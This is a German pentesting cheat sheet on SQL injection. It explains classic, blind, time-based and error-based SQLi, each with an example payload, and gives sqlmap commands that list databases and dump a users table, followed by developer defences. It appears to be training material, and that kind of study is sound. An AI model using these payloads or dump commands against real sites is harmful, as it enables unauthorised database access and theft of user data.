 Inhalt für web-pentesting/sqli.md

# 💉 SQL Injection (SQLi)

SQL Injection ist eine Schwachstelle, bei der Angreifer SQL-Befehle in Datenbankabfragen einschleusen können.

---

## 🔍 Typen von SQLi

### 1. Classic SQLi
- Klare Fehlermeldung oder sichtbares Verhalten
- Beispiel:

' OR '1'='1


### 2. Blind SQLi
- Keine direkte Rückmeldung
- Reaktion der Seite zeigt Erfolg (z. B. Redirect, Ladezeit)
- Beispiel (boolean-based):

' AND 1=1 --
' AND 1=2 --


### 3. Time-based Blind
- Verzögerung als Antwortindikator
- Beispiel:

' OR IF(1=1, SLEEP(5), 0) --


### 4. Error-based
- Erzwungene Fehlermeldung zeigt Details
- Beispiel:

' UNION SELECT 1, @@version --


---

## 🧪 Testmethoden

- `'` ans Ende von Parametern setzen
- `ORDER BY` zur Spaltenanzahl-Erkennung
- `UNION SELECT` zur Ausgabe beliebiger Werte
- Automatisiert mit **sqlmap**

---

## 🧰 Tools & Hilfen

| Tool      | Zweck                           |
|-----------|----------------------------------|
| Burp Suite | Parameterfuzzing & Analyse     |
| sqlmap    | Automatische SQLi-Erkennung     |
| wfuzz     | Parametertests (CLI)            |

---

## ⚙️ sqlmap Basics

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
sqlmap -u "http://.../id=1" -D testdb --tables
sqlmap -u "..." -D testdb -T users --dump

Optionen:

    --batch → Keine Nachfragen

    --cookie="PHPSESSID=..." → Session mitgeben

    --level=5 --risk=3 → Intensivere Tests

🛡️ Schutzmaßnahmen (für Entwickler)

    Prepared Statements / Parameterized Queries

    Keine dynamischen SQL-Strings

    Whitelisting statt Blacklisting

    Fehlerausgabe unterdrücken

📚 Weitere Quellen:

    PayloadAllTheThings – SQLi
